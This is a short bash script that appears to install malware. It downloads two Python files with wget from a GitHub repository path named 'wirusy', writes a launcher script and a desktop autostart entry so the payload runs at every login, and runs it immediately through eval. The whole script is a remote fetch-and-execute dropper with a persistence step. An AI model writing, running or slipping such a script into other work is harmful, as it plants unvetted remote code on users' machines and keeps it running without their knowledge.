rm okno.py
rm addautostart.py
wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/okno.py'
wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/addautostart.py'
user=$(whoami)
rm okno.sh
echo "python3 /home/$user/okno.py" > okno.sh
eval $"chmod +x '/home/$user/okno.sh'"
eval $"rm '/home/$user/.config/autostart/??.desktop'"
python3 /home/$user/addautostart.py '??' './home/$user/okno.sh'
eval $"chmod +x '/home/$user/.config/autostart/??.desktop'"
eval $"bash '/home/$user/okno.sh'"
